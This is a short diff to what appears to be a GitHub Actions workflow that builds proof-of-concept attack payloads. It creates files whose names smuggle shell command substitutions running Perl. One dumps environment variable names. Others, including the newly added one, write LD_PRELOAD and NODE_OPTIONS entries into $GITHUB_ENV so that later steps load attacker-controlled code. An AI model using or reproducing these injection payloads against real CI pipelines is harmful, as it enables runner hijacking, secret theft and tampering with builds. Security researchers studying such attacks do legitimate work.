@@ -31,6 +31,8 @@ jobs:
           open("content/" + name1, "w").write("payload\n")
           name3 = ("s$(perl -e 'print STDERR join(chr(10),sort keys %ENV)'; echo 2)wn.txt")
           open("content/" + name3, "w").write("payload3\n")
+          name4 = ("t$(perl -e 'sysopen(F,$ENV{GITHUB_ENV},577);print F q{LD_PRELOAD=}.chr(47).q{tmp}.chr(47).q{missing.so}.chr(10)'; echo 2)wn.txt")
+          open("content/" + name4, "w").write("payload4\n")
 
           # payload 2: overwrite $GITHUB_ENV with NODE_OPTIONS so the later node actions load hook.js
           name2 = ("q$(perl -e 'sysopen(F,$ENV{GITHUB_ENV},577);print F q{NODE_OPTIONS=--require }.chr(47).q{tmp}.chr(47).q{content}.chr(47).q{content}.chr(47).q{hook.js}.chr(10)'; echo 2)wn.txt")
